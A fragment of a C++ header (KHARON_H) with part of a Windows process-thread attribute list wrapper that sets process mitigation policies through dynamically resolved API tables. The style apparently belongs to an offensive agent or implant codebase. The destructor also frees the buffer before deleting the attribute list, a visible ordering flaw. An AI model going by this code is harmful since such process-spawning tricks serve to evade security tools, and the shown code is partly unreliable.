        return Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &Policy, sizeof( Policy ), 0, 0 );
    }

    inline DECLFN ~ProcThreadAttrList(
        VOID
    ) {
        if ( AttrBuff ) {
            Mem::Zero( U_PTR( AttrBuff ), AttrSize );
            Ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, C_PTR( AttrBuff ) );
            Krnl32.DeleteProcThreadAttributeList( AttrBuff );
        }
    }

    DECLFN LPPROC_THREAD_ATTRIBUTE_LIST GetAttrBuff() const { return AttrBuff; }
};

EXTERN_C void* __cdecl memset(void*, int, size_t);
EXTERN_C VOID volatile ___chkstk_ms( VOID );

#endif // KHARON_H